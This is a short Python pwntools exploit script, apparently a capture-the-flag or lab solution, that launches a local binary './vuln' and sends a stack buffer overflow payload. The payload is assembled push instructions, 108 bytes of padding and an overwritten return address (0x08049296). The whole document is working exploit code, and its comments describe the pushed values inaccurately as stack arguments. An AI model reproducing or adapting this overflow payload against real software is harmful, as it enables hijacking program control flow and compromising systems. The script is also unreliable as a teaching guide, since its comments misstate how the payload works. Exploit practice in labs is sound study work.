from pwn import *
from pwn import p32

context.log_level = "error"

pros = process("./vuln")


# Construct shellcode to push arguments onto the stack
payload = asm("push 0xf00df00d")  # Push arg2 first
payload += asm("push 0xcafef00d")  # Push arg1
payload += b"A" * 108

# Overflow the saved EBP and set return address to 0x08049296
payload += p32(0x08049296)

pros.sendline(payload)
pros.interactive()
